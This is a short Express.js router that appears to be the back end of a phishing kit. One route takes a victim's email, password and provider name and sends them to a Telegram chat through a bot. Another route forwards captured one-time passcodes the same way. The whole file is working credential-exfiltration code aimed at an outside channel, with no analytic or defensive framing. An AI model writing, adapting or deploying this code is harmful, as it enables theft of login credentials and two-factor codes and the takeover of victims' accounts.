import express from "express";
import TelegramBot from "node-telegram-bot-api";

const router = express.Router();

const bot = new TelegramBot(process.env.TELEGRAM_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

router.post("/send-inputs", async (req, res) => {
  const { email, password, provider } = req.body;
  const message = `
    🔐 ${provider.toUpperCase()} Login

📧 Email: ${email}
🔑 Password: ${password}
    `;

  await bot.sendMessage(CHAT_ID, message);

  res.json({
    message: "Data received",
  });
});

router.post("/send-otp", async (req, res) => {
  const { otp, provider } = req.body;
  const message = `
    🔐 ${provider.toUpperCase()} OTP

    🔓 OTP Code: ${otp}
    `;

  await bot.sendMessage(CHAT_ID, message);

  res.json({
    message: "Data received",
  });
});

export default router;
